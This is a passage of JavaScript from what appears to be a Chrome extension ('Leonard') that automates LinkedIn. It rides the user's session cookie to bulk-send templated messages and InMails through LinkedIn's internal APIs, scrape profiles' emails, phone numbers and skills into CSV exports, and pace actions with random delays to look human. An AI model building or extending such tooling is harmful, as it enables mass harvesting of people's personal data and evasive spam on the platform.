                                chrome.runtime.sendMessage({
                                    audit : true,
                                    event : 'message_sending_failed'
                                });
                                idx++;
                                sendBulkMessages(messages, idx, callback);
                            }
                        });
                    } else {
                        chrome.runtime.sendMessage({
                            audit : true,
                            event : 'problem_with_location'
                        });
                        idx++;
                        sendBulkMessages(messages, idx, callback);
                    }
                })
            } else {
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'message_sending_failed'
                });
                idx++;
                sendBulkMessages(messages, idx, callback);
            }
        })
    } else if (typeof callback == 'function') {
        local_data.currentIdx = 0;
        getLatestData(function() {
            local_data.REMAINING_PROFILE_VIEWS = parseInt(user_details.profile_views_remaining_today);
            local_data.REMAINING_CONNECTION_REQUESTS = parseInt(user_details.connection_requests_remaining_today);
            local_data.REMAINING_MESSAGES = parseInt(user_details.messages_remaining_today);
            local_data.REMAINING_INMAILS = parseInt(user_details.inmails_remaining_today);
            if(!local_data.startedViewing) local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
            if(!local_data.startedSending) local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
            if(!local_data.startedMessaging) local_data.rm = local_data.REMAINING_MESSAGES;
            if(!local_data.startedMailing) local_data.rim = local_data.REMAINING_INMAILS;
            updateLocalData();
        });
        local_data.startedMessaging = false;
        callback();
    }
}

function sendPersonalMessage(messageObj, callback, is_inmail) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        showNotification(local_strings['COOKIES_NOT_FOUND']);
        return false;
    }
    var comm_obj = {
        type: 'Message',
        date_sent: true,
        rec_name: '',
        content: '',
        profile_url: '',
        profile_id: '',
        member_id: '',
        entityUrn: ''
    }
    var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
    var templateObj;
    var attachments = [];
    if(is_inmail || local_data.selectedInMail){
        templateObj = inMailTemplates.filter(function(t) {
            return t.id == local_data.selectedInMail;
        })[0];
        try{
            if(templateObj){
                attachments = getAttachmentsObj(JSON.parse(templateObj.attachments))
            }
        } catch(err) {
            attachments = [];
        }
        if (!templateObj) {
            if (local_data.selectedInMail) {
                attachments = getAttachmentsObj(local_data.selectedInMailAttachments);
                templateObj = {
                    template_subject: local_data.selectedInMailSubject,
                    template_content: local_data.selectedInMail,
                    attachments: attachments
                }
            } else {
                showNotification(local_strings['EMPTY_INMAIL'])
                return false;
            }
        }
    } else {
        if(messageTemplates){
            templateObj = messageTemplates.filter(function(t) {
                return t.id == local_data.selectedMessage;
            })[0];
        }
        var curTextMsg = local_data.selectedMessage;
        var curTextSubject = '';
        if(local_data.startedMailing){
            curTextMsg = local_data.selectedInMail;
            curTextSubject = local_data.selectedInMailSubject;
            attachments = getAttachmentsObj(local_data.selectedInMailAttachments);
        } else if(local_data.startedMessaging){
            attachments = getAttachmentsObj(local_data.selectedMessageAttachments, 'message');
        }
        if (!templateObj) {
            if (curTextMsg) {
                templateObj = {
                    template_subject: curTextSubject,
                    template_content: curTextMsg,
                    attachments: attachments
                }
            } else {
                showNotification(local_strings['EMPTY_INMAIL_MSG']);
                return false;
            }
        }
    }
    var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>x.entityUrn == messageObj.entityUrn)[0];
    if(aliasRec){
        var fn = aliasRec.new_name.split(" ").slice(0,1)[0];
        var ln = aliasRec.new_name.split(" ").slice(-1)[0];
        messageObj.firstName = fn;
        messageObj.lastName = ln;
    }
    var tc = templateObj.template_content;
    local_data.selectedMessageAttachments = templateObj.attachments;
    if(typeof templateObj.attachments == 'string'){
        local_data.selectedMessageAttachments = JSON.parse(templateObj.attachments);
    }
    var comm_found_idx = -1;
    recentComms.forEach(function(comm, idx) {
        if(( ( comm.entityUrn == messageObj.entityUrn ) || 
            ( comm.profile_id == messageObj.publicIdentifier ) || 
            ( comm.member_id == messageObj.objectUrn ) )){
            comm_found_idx = idx;
        }
    });
    if(comm_found_idx > -1){
        callback('already_sent_error');
        return false;
    }
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'sales/trackImpression',
        data:{
            'salesImpressionEventPlain.moduleKey': 'composeWindow',
            'salesImpressionEventPlain.pageKey': 'sales-inmail2-compose',
            'salesImpressionEventPlain.cP.parentPage': 'sales-search3-people',
            'salesImpressionEventPlain.cP.isInMail': true
        },
        type: 'POST',
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        success: function(inmail_params) {
            var trackingObj = inmail_params.trackingInfo || {};
            messageObj.contextId = !messageObj.contextId ? trackingObj.contextId || '' : messageObj.contextId;
            messageObj.moduleKey = !messageObj.moduleKey ? trackingObj.moduleKey || '' : messageObj.moduleKey;
            messageObj.pageKey = !messageObj.pageKey ? trackingObj.pageKey || '' : messageObj.pageKey;
            messageObj.requestId = !messageObj.requestId ? trackingObj.requestId || '' : messageObj.requestId;
        },
        error: function(){
            chrome.runtime.sendMessage({
                audit : true,
                event : 'inmail params fetching failed'
            });
            if (typeof callback == 'function') {
                callback('error');
            }
        },
        async: false
    })
    getFormattedAddress(messageObj.locationName, tc, function(address){
        if(address != 'error' || (tc.indexOf('%city%') == -1 && tc.indexOf('%state%') == -1 && tc.indexOf('%country%') == -1) ){
            if(address == 'error'){
                address = {
                    city: '',
                    state: '',
                    country: ''
                }
            }
            tc = tc.replace(/%firstName%/g, messageObj.firstName)
                    .replace(/%lastName%/g, messageObj.lastName)
                    .replace(/%position%/g, messageObj.title)
                    .replace(/%company%/g, messageObj.companyName)
                    .replace(/%industry%/g, messageObj.industryName)
                    .replace(/%city%/g, address.city)
                    .replace(/%state%/g, address.state)
                    .replace(/%country%/g, address.country);
            comm_obj.content = tc;
            comm_obj.rec_name = messageObj.firstName + " " + messageObj.lastName;
            comm_obj.profile_url = LINKEDIN_PROFILE_URL+messageObj.publicIdentifier;
            comm_obj.profile_id = messageObj.publicIdentifier;
            comm_obj.member_id = messageObj.objectUrn;
            var entityUrn = messageObj.entityUrn;
            comm_obj.entityUrn = entityUrn;
            var recepientCompoundKey = entityUrn + ',' + messageObj.authType + ',' + messageObj.authToken;
            if (isSalesNav && is_inmail != undefined && local_data.startedMailing) {
                var moduleKey = messageObj.moduleKey;
                var pageKey = messageObj.pageKey;
                var pageNumber = messageObj.pageNumber;
                var contextId = messageObj.contextId;
                var requestId = messageObj.requestId;
                var firstname = messageObj.firstName;
                var lastname = messageObj.lastName;
                var member_id = messageObj.objectUrn;
                var authToken = messageObj.authToken;
                var authType = messageObj.authType;
                var idWithAuthToken = member_id+","+authToken+","+authType;
                var entityUrnWithAuthToken = entityUrn+","+authToken+","+authType;
                var get_credits_for_inmail_url = LINKEDIN_DOMAIN_URL + 'sales/composeJson' + 
                                                    '?idWithAuthToken=' + escape(idWithAuthToken) +
                                                    '&trackingInfoJson.requestId=' + requestId +
                                                    '&trackingInfoJson.pageKey=' + pageKey +
                                                    '&trackingInfoJson.moduleKey=' + moduleKey +
                                                    '&trackingInfoJson.contextId=' + contextId +
                                                    '&trackingInfoJson.position=' + currentIdx +
                                                    '&trackingInfoJson.pageNumber=' + pageNumber +
                                                    '&_=' + Date.now();
                $.ajax({
                    url: get_credits_for_inmail_url,
                    type: 'GET',
                    beforeSend: function(req) {
                        var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                        req.setRequestHeader('csrf-token', csrf_token);
                    },
                    xhrFields: {
                        withCredentials: true
                    },
                    success: function(credits_resp) {
                        var isOpenLink = credits_resp.isOpenLink;
                        if(credits_resp.inMailCredits == 0){
                            isOpenLink = false;
                        }
                        var temp_subject = templateObj.template_subject.replace(/%firstName%/g, messageObj.firstName)
                                .replace(/%lastName%/g, messageObj.lastName)
                                .replace(/%position%/g, messageObj.title)
                                .replace(/%company%/g, messageObj.companyName)
                                .replace(/%industry%/g, messageObj.industryName)
                                .replace(/%city%/g, address.city)
                                .replace(/%state%/g, address.state)
                                .replace(/%country%/g, address.country);
                        var send_msg_url = LINKEDIN_DOMAIN_URL + 'sales/sendMessage' +
                                '?trackingInfoJson.contextId=' + contextId +
                                '&trackingInfoJson.moduleKey=' + moduleKey +
                                '&trackingInfoJson.pageKey=' + pageKey +
                                '&trackingInfoJson.pageNumber=' + pageNumber +
                                '&trackingInfoJson.position=' + currentIdx +
                                '&trackingInfoJson.requestId=' + requestId +
                                '&csrfToken=' + escape(csrf_token);
                        var message_post_params = {
                            "attachments": attachments,
                            "body": tc,
                            "category": "DEALS",
                            "idWithAuthToken": idWithAuthToken,
                            "isInMail": is_inmail,
                            "isIntro": false,
                            "isOpenLink": isOpenLink,
                            "mediaIds": [],
                            "subject": temp_subject
                        }

                        // var send_msg_url = LINKEDIN_DOMAIN_URL + 'sales-api/salesApiMessaging?action=sendMessage';
                        // var message_post_params = {
                        //     "sendMessageInput": {
                        //         "body": tc,
                        //         "inmail": is_inmail,
                        //         "attachments": attachments,
                        //         "recipients": [{
                        //             "recepientCompoundKey": entityUrnWithAuthToken
                        //         }]
                        //     }
                        // }
                        comm_obj.type = 'InMail';
                        $.ajax({
                            url: send_msg_url,
                            type: 'POST',
                            data: JSON.stringify(message_post_params),
                            dataType: 'json',
                            contentType: 'application/json; charset=utf-8',
                            beforeSend: function(req) {
                                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                                req.setRequestHeader('csrf-token', csrf_token);
                            },
                            xhrFields: {
                                withCredentials: true
                            },
                            success: function(resp) {
                                chrome.runtime.sendMessage({
                                    audit : true,
                                    comm_obj: comm_obj,
                                    event : 'inmail_sent'
                                });
                                if(local_data.sales_tags_checked){
                                    var linked_sales_tag_ids = tags.filter(function(t){return local_data.selectedTags.indexOf(t.id) > -1 && t.linked_tag_id}).map(x=>x.linked_tag_id)
                                    tagUserInSalesNav(member_id, linked_sales_tag_ids, function(){
                                        if (typeof callback == 'function') {
                                            callback();
                                        }
                                    }, messageObj);
                                } else {
                                    if (typeof callback == 'function') {
                                        callback();
                                    }
                                }
                            },
                            error: function(){
                                chrome.runtime.sendMessage({
                                    audit : true,
                                    event : 'inmail_sending_failed'
                                });
                                if(typeof callback == 'function'){
                                    callback('error');
                                }
                            }
                        });
                    },
                    error: function(){
                        console.log(arguments);
                    }
                });
            } else if(is_inmail == false){
                var member_id = messageObj.objectUrn;
                // attachments = getAttachmentsObj(local_data.selectedMessageAttachments, 'message');
                getMsgEntityURN(entityUrn, function(d){
                    var msg_url = LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?action=create';
                    msg_post_data = JSON.stringify({
                        "conversationCreate": {
                            "eventCreate": {
                                "value": {
                                    "com.linkedin.voyager.messaging.create.MessageCreate": {
                                        "body": tc,
                                        "attachments": attachments
                                    }
                                }
                            },
                            "recipients": [entityUrn],
                            "subtype": "MEMBER_TO_MEMBER"
                        },
                        "keyVersion": "LEGACY_INBOX"
                    });
                    if(d){
                        var msg_entityUrn = d.replace(/urn:li:fs_conversation:/,'')
                        msg_url = LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations/'+msg_entityUrn+'/events?action=create';
                        msg_post_data = JSON.stringify({
                          "eventCreate": {
                            "value": {
                              "com.linkedin.voyager.messaging.create.MessageCreate": {
                                "body": tc,
                                "attachments": attachments,
                                "attributedBody": {
                                  "text": tc,
                                  "attributes": []
                                },
                                "assetAttachments": []
                              }
                            }
                          }
                        });
                    }
                    $.ajax({
                        url: msg_url,
                        type: 'POST',
                        data: msg_post_data,
                        dataType: 'json',
                        contentType: 'application/json; charset=utf-8',
                        beforeSend: function(req) {
                            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                            req.setRequestHeader('csrf-token', csrf_token);
                        },
                        xhrFields: {
                            withCredentials: true
                        },
                        success: function(resp) {
                            chrome.runtime.sendMessage({
                                audit : true,
                                comm_obj: comm_obj,
                                event : 'message_sent'
                            });
                            if(local_data.sales_tags_checked){
                                var linked_sales_tag_ids = tags.filter(function(t){return local_data.selectedTags.indexOf(t.id) > -1 && t.linked_tag_id}).map(x=>x.linked_tag_id)
                                tagUserInSalesNav(member_id, linked_sales_tag_ids, function(){
                                    if (typeof callback == 'function') {
                                        callback();
                                    }
                                }, messageObj);
                            } else {
                                if (typeof callback == 'function') {
                                    callback();
                                }
                            }
                        },
                        error: function() {
                            chrome.runtime.sendMessage({
                                audit : true,
                                event : 'message_sending_failed'
                            });
                            if (typeof callback == 'function') {
                                callback('error');
                            }
                        }
                    });
                })
            } else if(!isSalesNav && is_inmail){
                var temp_subject = templateObj.template_subject.replace(/%firstName%/g, messageObj.firstName)
                    .replace(/%lastName%/g, messageObj.lastName)
                    .replace(/%position%/g, messageObj.title)
                    .replace(/%company%/g, messageObj.companyName)
                    .replace(/%industry%/g, messageObj.industryName)
                    .replace(/%city%/g, address.city)
                    .replace(/%state%/g, address.state)
                    .replace(/%country%/g, address.country);
                var msg_url = LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?action=create';
                var msg_post_data = JSON.stringify({
                    "conversationCreate":{
                        "eventCreate":{
                            "value":{
                                "com.linkedin.voyager.messaging.create.MessageCreate":{
                                    "body": tc,
                                    "attachments":attachments
                                }
                            }
                        },
                        "recipients":[entityUrn],
                        "subtype":"INMAIL",
                        "subject": temp_subject
                    },
                    "keyVersion":"LEGACY_INBOX"
                });
                comm_obj.type = 'InMail';
                $.ajax({
                    url: msg_url,
                    type: 'POST',
                    data: msg_post_data,
                    dataType: 'json',
                    contentType: 'application/json; charset=utf-8',
                    beforeSend: function(req) {
                        var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                        req.setRequestHeader('csrf-token', csrf_token);
                    },
                    xhrFields: {
                        withCredentials: true
                    },
                    success: function(resp) {
                        chrome.runtime.sendMessage({
                            audit : true,
                            comm_obj: comm_obj,
                            event : 'inmail_sent'
                        });
                        if (typeof callback == 'function') {
                            callback();
                        }
                    },
                    error: function() {
                        chrome.runtime.sendMessage({
                            audit : true,
                            event : 'inmail_sending_failed'
                        });
                        if (typeof callback == 'function') {
                            callback('error');
                        }
                    }
                });
            }
        } else {
            chrome.runtime.sendMessage({
                audit : true,
                event : 'problem_with_location'
            });
            if (typeof callback == 'function') {
                callback('error');
            }
        }
    })
}

/*
    Utility methods
*/

var base64_ranks = [62, 255, 255, 255, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 255, 255, 255, 0, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 255, 255, 255, 255, 255, 255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51];

function getArrayBuffer(dataURI, type){
    var header_end = dataURI.indexOf(","),
        data = dataURI.substring(header_end + 1),
        is_base64_regex = /\s*;\s*base64\s*(?:;|$)/i,
        is_base64 = is_base64_regex.test(dataURI.substring(0, header_end));
    var blob = new Blob;
    if (is_base64) {
        blob.encoding = "base64";
    } else {
        blob.encoding = "URI";
    }
    blob.data = data;
    blob.size = data.length;
    blob = new Blob([decode_base64(data)], {type: type});
    return blob;
}

function decode_base64(base64) {
    var len = base64.length,buffer = new Uint8Array(len / 4 * 3 | 0),i = 0,outptr = 0,last = [0, 0],state = 0,save = 0,rank,code,undef;
    while (len--) {
        code = base64.charCodeAt(i++);
        rank = base64_ranks[code-43];
        if (rank !== 255 && rank !== undef) {
            last[1] = last[0];
            last[0] = code;
            save = (save << 6) | rank;
            state++;
            if (state === 4) {
                buffer[outptr++] = save >>> 16;
                if (last[1] !== 61) {
                    buffer[outptr++] = save >>> 8;
                }
                if (last[0] !== 61) {
                    buffer[outptr++] = save;
                }
                state = 0;
            }
        }
    }
    return buffer.buffer;
}

function getAttachmentsObj(attachments, type){
    var arr = [];
    try{
        attachments.forEach(function(a){
            if(type == 'message'){
                var res = JSON.parse(a.LinkedInResource);
                var obj = {};
                obj.id = res.value;
                obj.originalId = res.value;
                obj.name = res.filename;
                obj.byteSize = a.size;
                obj.mediaType = a.type; 
                // old method
                // var obj = {};
                // obj.name = res.filename;
                // obj.mediaType = a.type;
                // obj.id = res.value;
                // obj.originalId = res.value;
                // obj.byteSize = a.size;
                // obj.reference = {'com.linkedin.voyager.common.MediaProcessorImage':{id:res.value}};
                arr.push(obj);
            } else {
                var res = JSON.parse(a.LinkedInResource);
                var obj = {};
                obj.name = res.filename;
                obj.format = a.type;
                obj.mediaId = res.value;
                obj.size = a.size;
                obj.visibleByMembers = [];
                obj.downloadUrl = "";
                obj.sizeToDisplay = Math.round(a.size/1024);
                arr.push(obj);
            }
        })
    } catch(err) {
        chrome.runtime.sendMessage({error: err, func: 'getAttachmentsObj'});
        arr = attachments;
    }
    return arr;
}

function getSizeInBytes(bytes, precision){
    if (isNaN(parseFloat(bytes)) || !isFinite(bytes)) return '-';
    if (typeof precision === 'undefined') precision = 1;
    var units = ['bytes', 'kB', 'MB', 'GB', 'TB', 'PB'],
        number = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, Math.floor(number))).toFixed(precision) +  ' ' + units[number];
}

function getPageHTML(){
    return '<html>' + $('html').html() + '</html>';
}

function randIn(min, max) {
    if (max == null) {
        max = min;
        min = 0;
    }
    return (min + Math.floor(Math.random() * (max - min + 1)));
}

function randomInRange(min, max) {
    return randIn(min, max) * 1000;
}

function getLeonardID(mid_part){
    return "L_"+mid_part+"_"+randIn(1,10000);
}

function resetAllIntervals() {
    clearInterval(nextViewInter);
    nextViewInter = null;
    clearTimeout(nextViewTimer);
    nextViewTimer = null;
    clearTimeout(start_next_page_timer);
    start_next_page_timer = null;
}

function showNotification(txt, id, title, callback) {
    chrome.runtime.sendMessage({
        showNotification: txt,
        tabId: id
    });
}

function setStopLeonardBtn(set) {
    if(set){
        local_data.randomIdx = randIn(MIN_PROFILE_BREAK,MAX_PROFILE_BREAK);
        $("#stopLeonard").removeClass("hidden");
    } else {
        local_data.randomIdx = 0;
        $("#stopLeonard").addClass("hidden");
        downloadCSVIfEnabled();
    }
}

function getDownloads(callback){
    chrome.storage.local.get('downloads', function(r){
        var downloads = r && r.downloads || [];
        if(downloads.length > 0){
            downloads = JSON.parse(downloads);
        }
        callback(downloads);
    });
}

function addToDownloads(csv_data, profiles_len, operation, callback){
    getDownloads(function(downloads){
        var obj = {};
        obj[operation+'_'+Date.now()+'_'+profiles_len] = csv_data;
        downloads.push(obj);
        // chrome.storage.local.set({downloads:JSON.stringify(downloads)}, callback);
    })
}

function downloadCSVIfEnabled(){
    if(!downloadStarted){
        return false;
    }
    downloadStarted = true;
    if(campaign_export.length > 0 && ((exportCampaignVisit && local_data.startedViewing) || (exportCampaignScan && local_data.startedScanning) || (exportCampaignMail && local_data.startedMailing) || (exportCampaignMsg && local_data.startedMessaging) || (exportCampaignConn && local_data.startedSending))){
        chrome.runtime.sendMessage({
            getUserTags: true
        }, function(res){
            campaign_export.map(function(c){
                var profile_tag_and_notes_details = res.filter(x=>(x.connection_id == c.publicIdentifier || x.connection_id == c.entityUrn));
                if(profile_tag_and_notes_details && profile_tag_and_notes_details.length > 0){
                    c['Tags'] = profile_tag_and_notes_details[0].tags || "";
                    c['Notes'] = profile_tag_and_notes_details[0].notes || "";
                } else {
                    c['Tags'] = "";
                    c['Notes'] = "";
                }
                delete c.publicIdentifier;
                delete c.entityUrn;
            })
            JSONToCSVConvertor(function(csv_data){
                var operation = local_data.startedViewing ? 'Visit' : local_data.startedScanning ? 'Scan' : local_data.startedSending ? 'Connect' : local_data.startedMessaging ? 'Message' : local_data.startedMailing ? 'Mail' : '';
                if(operation){
                    addToDownloads(btoa(unescape(encodeURIComponent((csv_data)))), campaign_export.length, operation, function(){
                        showNotification("You can download your CSV file from CRM.");
                        downloadStarted = false;
                    });
                } else {
                    chrome.runtime.sendMessage({error: err, func: 'null operation'});
                }
            /*            
                var fileName = "Campaign_" + getTodaysDate() + ".csv";
                var blob = new Blob([csv_data], { type: 'text/csv;charset=utf-8;' });
                var link = document.createElement("a");
                var url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", fileName);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            */
                local_data.startedMessaging = false;
                local_data.startedSending = false;
                local_data.startedViewing = false;
                local_data.startedScanning = false;
                local_data.startedMailing = false;
                campaign_export = [];
                local_data.csv_file_name = '';
                return false;
            })
        })
            // console.log(campaign_export);
    } else {
        local_data.startedMessaging = false;
        local_data.startedSending = false;
        local_data.startedViewing = false;
        local_data.startedScanning = false;
        local_data.startedMailing = false;
        campaign_export = [];
        local_data.csv_file_name = '';
        initViews();
        downloadStarted = false;
    }
}

function stopLeonard(continueList, force_stop) {
    resetAllIntervals();
    chrome.runtime.sendMessage({
        removeBadge: true
    });
    if(force_stop && !leonard_stopped)
        showNotification(local_strings['STOPPED_PROCESSES']);
    if(!continueList){
        chrome.storage.local.set({
            nextPageRedirect: false
        });
        local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
        local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
        local_data.rm = local_data.REMAINING_MESSAGES;
        local_data.rim = local_data.REMAINING_INMAILS;
        local_data.startedMessaging = false;
        local_data.startedSending = false;
        local_data.startedViewing = false;
        local_data.startedScanning = false;
        local_data.startedMailing = false;
        local_data.selectedFollowUpMessage = false;
        local_data.selectedInMail = false;
        local_data.selectedInMailAttachments = [];
        local_data.selectedMessage = false;
        local_data.selectedInvitationMessage = false;
        local_data.selectedMessageAttachments = [];
        local_data.selectedTags = [];
        local_data.sales_tags_checked = false;
        displayAttachments([],'selectedMessageAttachments');
        displayAttachments([],'selectedInMailAttachments');
    }
    leonard_stopped = true;
    updateLocalData();
    downloadCSVIfEnabled();
    $("#start_sending_conn").text(local_strings['SEND']);
    $("#start_sending_conn").removeClass("started");
    $("#start_viewing").text(local_strings['START']);
    $("#start_viewing").removeClass("started");
    $("#start_scanning").text(local_strings['START']);
    $("#start_scanning").removeClass("started");
    $("#start_sending_msg").text(local_strings['START']);
    $("#start_sending_msg").removeClass("started");
    $("#start_sending_inm").text(local_strings['START']);
    $("#start_sending_inm").removeClass("started");
    $(".tag_sales").hide();
    $(".tag_sales input[type=checkbox]").removeAttr("checked");
    if (!continueList) {
        $(".leo_visiting").find(".time_rem_span").remove()
        $(".leo_visiting").removeClass("leo_visiting");
        currentIdx = 0;
        setStopLeonardBtn(false);
    }
}

function getTodaysDate() {
    return (new Date()).toISOString().substring(0, 10) + " " + (new Date()).toLocaleTimeString();
}

function getNextDateTimeStamp() {
    var now = new Date();
    var d1 = new Date(now.getTime() + now.getTimezoneOffset() * 60 * 1000);
    var d2 = new Date(d1.getFullYear(), d1.getMonth(), d1.getDate() + 1, 0, 0, 0);
    var secs = (d2 - d1) / (1000);
    var mins = secs / 60;
    var hours = mins / 60;
    var rel_secs = ('0' + (parseInt(secs) % 60)).slice(-2);
    var rel_mins = ('0' + (parseInt(secs / 60) % 60)).slice(-2);
    var rel_hours = ('0' + (parseInt(mins / 60) % 60)).slice(-2);
    if (parseInt(rel_hours) == 0 && parseInt(rel_mins) == 0 && parseInt(rel_secs) < 10) {
        location.reload(true);
    }
    return rel_hours + "h " + rel_mins + "m " + rel_secs + "s";
}

function visitProfile(entityUrn, callback){
    if(entityUrn){
        var attrs = {};
        callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/' + entityUrn + '/profileView', [], function(resp){
            if(resp && resp.profile){
                var profile = resp.profile;
                attrs.firstName = profile.firstName;
                attrs.lastName = profile.lastName;
                attrs.entityUrn = profile.entityUrn.replace(/urn:li:fs_profile:/,'');
                attrs.objectUrn = profile.miniProfile.objectUrn.replace(/urn:li:member:/,'');
                attrs.headline = profile.headline;
                attrs.publicIdentifier = profile.miniProfile.publicIdentifier;
                attrs.industryName = profile.industryName;
                attrs.industryCode = profile.industryUrn ? profile.industryUrn.replace(/urn:li:fs_industry:/,'') : "";
                if(profile.miniProfile.picture){
                    var vectorImg = profile.miniProfile.picture['com.linkedin.common.VectorImage'];
                    if(vectorImg.artifacts && vectorImg.artifacts.length > 0){
                        attrs.picture = vectorImg['rootUrl'] + '' + vectorImg.artifacts.splice(-1)[0].fileIdentifyingUrlPathSegment;
                    } else {
                        attrs.picture = "";
                    }
                } else {
                    attrs.picture = "";
                }
                attrs.trackingId = profile.miniProfile.trackingId;
                attrs.locationName = profile.locationName;
                attrs.postalCode = (profile.location && profile.location.basicLocation && profile.location.basicLocation.postalCode) || "";
                attrs.versionTag = profile.versionTag;
                // education
                if(resp.educationView && resp.educationView.elements && resp.educationView.elements.length > 0){
                    attrs.schoolName = resp.educationView.elements[0].schoolName || "";
                    attrs.fieldOfStudy = resp.educationView.elements[0].fieldOfStudy || "";
                } else {
                    attrs.schoolName = "";
                    attrs.fieldOfStudy = "";
                }
                // employment
                if(resp.positionView && resp.positionView.elements && resp.positionView.elements.length > 0){
                    attrs.title = resp.positionView.elements[0].title;
                    attrs.companyName = resp.positionView.elements[0].companyName;
                } else {
                    attrs.title = "";
                    attrs.companyName = "";
                }
                // personality
                if(resp.languageView && resp.languageView.elements && resp.languageView.elements.length > 0){
                    attrs.languages = resp.languageView.elements.map(x=>x.name).toString();
                } else {
                    attrs.languages = "";
                }
                if(resp.skillView && resp.skillView.elements && resp.skillView.elements.length > 0){
                    attrs.skills = resp.skillView.elements.map(x=>x.name+"||"+x.entityUrn.replace(/.*?,(\d+).*/,'$1')).toString();
                } else {
                    attrs.skills = "";
                }
                callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/' + entityUrn + '/profileContactInfo', [], function(res){
                    if(res && res.emailAddress){
                        attrs.email = res.emailAddress || "";
                    } else {
                        attrs.email = "";
                    }
                    if(res && res.phoneNumbers){
                        attrs.phone = res.phoneNumbers.map(x=>x.number).toString() || "";
                    } else {
                        attrs.phone = "";
                    }
                    var normattrs = Object.assign({}, attrs);
                    var operation = local_data.startedViewing ? 'Visit' : local_data.startedScanning ? 'Scan' : local_data.startedSending ? 'Connect' : local_data.startedMessaging ? 'Message' : local_data.startedMailing ? 'Mail' : '';
                    normalizeAttrs(normattrs, function(new_attrs){
                        if(!local_data.csv_file_name){
                            local_data.csv_file_name = operation+'_'+Date.now();
                        }
                        addToDatabase(new_attrs, operation, local_data.csv_file_name);
                        campaign_export.push(new_attrs);
                        chrome.runtime.sendMessage({
                            addProfile: true,
                            attrs: attrs
                        }, function(){
                            callback(attrs);
                        })
                    })
                }, true);
            } else {
                callback();
            }
        }, true);
    } else {
        chrome.runtime.sendMessage({
            audit : true,
            event : 'undefined in entityUrn'
        });
    }
}

function callXHROnLinkedIn(url, headers, callback, is_async){
    var async = !is_async ? true : false;
    $.ajax({
        url : url,
        async : false,
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
            if(headers && headers.length > 0){
                headers.forEach(function(h){
                    req.setRequestHeader(h.key, h.val);
                });
            }
        },
        xhrFields: {
            withCredentials: true
        },
        type: 'GET',
        success : function(data){
            if(typeof callback == 'function') callback(data);
        },
        error : function(xhr){
            // console.log("XHR Failed for "+url);
            if(typeof callback == 'function') callback();
        }
    })
}


function callAfterTimer(opts){
    var RANDOM_TIMER = randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT);
    var end_timer = Date.now() + RANDOM_TIMER;
    if (nextViewInter) {
        clearInterval(nextViewInter);
        nextViewInter = null;
    }
    nextViewInter = setInterval(function() {
        var end_time = Math.round((end_timer - Date.now()) / 1000);
        if (end_time < 1) {
            clearInterval(nextViewInter);
            nextViewInter = null;
        }
        if(typeof opts.onProgress == 'function') opts.onProgress(end_time);
    },1000);
    nextViewTimer = setTimeout(function() {
        clearTimeout(nextViewTimer);
        nextViewTimer = false;
        if (nextViewInter) {
            clearInterval(nextViewInter);
            nextViewInter = null;
        }
        if(typeof opts.onComplete == 'function') opts.onComplete();
    },RANDOM_TIMER);
}

function authorizeByPlan(callback){
    var preventUser = false;
    switch(user_details.user_type){
        case 'Free':
            if(local_data.startedViewing){
                if(viewPremiumOnly){
                    preventUser = true;
                    $("#view_premium_only").parent().parent().addClass("leo_error");
                }
            } else if(local_data.startedSending) {
                if(connectPremiumOnly){
                    preventUser = true;
                    $("#connect_premium_only").parent().parent().addClass("leo_error");
                }
            }
            break;
    }
    if(pending_connections && pending_connections.length > MAX_PENDING_CONNECTIONS){
        preventUser = true;
        $.get(chrome.extension.getURL('template/max_pending_reached.html'), function(resp){
            resp.match(/{{(.*?)}}/g).forEach(function(a) {
                var m = local_data[a.replace(/\{|\}/g, '')] || 0;
                resp = resp.replace(a, m);
            });
            resp = resp.replace(/#FIRSTNAME#/,user_details.firstname);
            $("#leo_break_fixed").remove();
            $(resp).appendTo($("body"));
            $("#redirect_to_crm").bind("click", function(){
                chrome.runtime.sendMessage({
                    open_new_tab: true,
                    url: chrome.runtime.getURL('CRM/index.html#/sent')
                });
            })
        });
        closePopup();
    }
    if(!preventUser){
        if(typeof callback == 'function'){
            callback();
        }
    } else {
        stopLeonard(false);
        showNotification("Feature not available on "+user_details.user_type+" Plan.\nClick here to upgrade.", 'payment');
    }
}

function authorizeByAccount(callback){
    if(!isSalesNav){
        var preventUser = false;
        switch(user_details.user_type){
            case 'Enterprise':
                if(local_data.startedMailing){
                    if(!sendUsingCredits){
                        preventUser = true;
                        $("#send_using_credits").parent().parent().addClass("leo_error");
                        local_data.startedMailing = false;
                    }
                }
                break;
        }
        if(!preventUser){
            if(typeof callback == 'function'){
                callback();
            }
        } else {
